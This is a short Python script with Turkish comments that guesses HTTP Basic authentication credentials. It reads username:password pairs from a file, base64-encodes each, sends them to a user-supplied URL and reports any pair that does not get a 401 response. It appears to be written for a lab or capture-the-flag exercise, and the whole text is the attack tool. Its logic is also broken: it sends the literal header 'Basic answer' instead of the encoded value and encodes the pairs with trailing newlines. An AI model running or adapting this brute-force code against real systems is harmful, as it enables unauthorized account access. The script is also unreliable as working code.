import requests
import base64

url = input("enter url")

f=open("user:password.txt","r")#user:password.txt şifrelerin olduğu dosya

for creds in f:
    print(creds.strip())
    encoded = base64.b64encode(creds.encode())
    print(encoded.decode())
    # copy as curl or just try with network-> curl command -> authorization basic -- answer
    header = {'Authorization':'Basic answer'}#decode ederek bulduğun kod answer olur
    response =requests.get(url,headers=header)
    print(response.text)
    print(response.status_code)
    if int(response.status_code) !=401:
        print(creds.strip())#http şifreleri farklı olursa döner
